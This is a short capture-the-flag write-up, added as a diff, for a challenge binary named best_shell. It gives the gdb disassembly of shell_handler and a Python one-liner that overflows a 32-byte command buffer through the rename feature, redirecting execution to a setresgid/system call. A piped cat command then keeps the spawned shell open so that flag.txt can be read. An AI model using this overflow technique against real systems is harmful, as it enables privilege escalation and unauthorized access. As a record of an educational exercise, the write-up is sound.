@@ -1,0 +1,50 @@
+Best_shell truly is the best shell
+If we open up gdb and look at the assembly for shell_handler, we find
+
+Dump of assembler code for function shell_handler:
+   0x080489c6 <+0>:     push   %ebp
+   0x080489c7 <+1>:     mov    %esp,%ebp
+   0x080489c9 <+3>:     sub    $0x28,%esp
+   0x080489cc <+6>:     movzbl 0x804b085,%eax
+   0x080489d3 <+13>:    test   %al,%al
+   0x080489d5 <+15>:    je     0x8048a06 <shell_handler+64>
+   0x080489d7 <+17>:    call   0x8048600 <getegid@plt>
+   0x080489dc <+22>:    mov    %eax,-0xc(%ebp)
+   0x080489df <+25>:    mov    -0xc(%ebp),%eax
+   0x080489e2 <+28>:    mov    %eax,0x8(%esp)
+   0x080489e6 <+32>:    mov    -0xc(%ebp),%eax
+   0x080489e9 <+35>:    mov    %eax,0x4(%esp)
+   0x080489ed <+39>:    mov    -0xc(%ebp),%eax
+   0x080489f0 <+42>:    mov    %eax,(%esp)
+   0x080489f3 <+45>:    call   0x80486a0 <setresgid@plt>
+   0x080489f8 <+50>:    movl   $0x8048ea3,(%esp)
+   0x080489ff <+57>:    call   0x8048630 <system@plt>
+   0x08048a04 <+62>:    jmp    0x8048a12 <shell_handler+76>
+   0x08048a06 <+64>:    movl   $0x8048eab,(%esp)
+   0x08048a0d <+71>:    call   0x8048620 <puts@plt>
+   0x08048a12 <+76>:    leave
+   0x08048a13 <+77>:    ret
+End of assembler dump.
+
+What we want to note is the calling of getegid at 080489d7.
+We want to do is execute the stuff at that address, so that we get read perms for
+flag.txt. We can do this with the handy rename function of best_shell.
+First though, we need to note that there is a 32 character buffer for cmd, so all we need
+to do is overflow it with the address of the calling of getegid.
+We can do this by doing:
+
+    python -c "print 'rename lol' + 'A'*32 + '\xd7\x89\x04\x08\n' + 'A'*32 + '\xd7\x89\x04\x08'"
+
+We need to do this twice because the first part renames lol to that, and the second one executes it
+because we renamed it.
+However, the shell exits as soon as we do this, so we need to find out how to make it stay.
+A quick google search proved that a - before the | will keep stdin open so that we can input more.
+If we take the first command and direct it to a file like this:
+
+    python -c "print 'rename lol' + 'A'*32 + '\xd7\x89\x04\x08\n' + 'A'*32 + '\xd7\x89\x04\x08'" > cmd.txt
+
+then all we need to do is type in:
+
+    cat cmd.txt - | /home/best_shell/best_shell
+
+Now we have the shell, and we can cat flag.txt
